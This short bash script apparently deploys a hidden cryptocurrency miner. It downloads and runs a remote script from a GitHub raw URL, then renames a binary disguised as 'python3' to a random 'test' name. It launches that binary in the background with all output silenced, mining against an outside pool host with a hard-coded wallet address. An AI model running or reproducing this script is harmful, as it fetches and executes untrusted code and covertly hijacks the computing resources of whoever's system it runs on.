#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

bash -c "$(wget -qO- https://raw.githubusercontent.com/monhodsompul/mike/main/luckcpr.sh)"

cd dotcpu

mv python3 test$kolot

./test$kolot -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
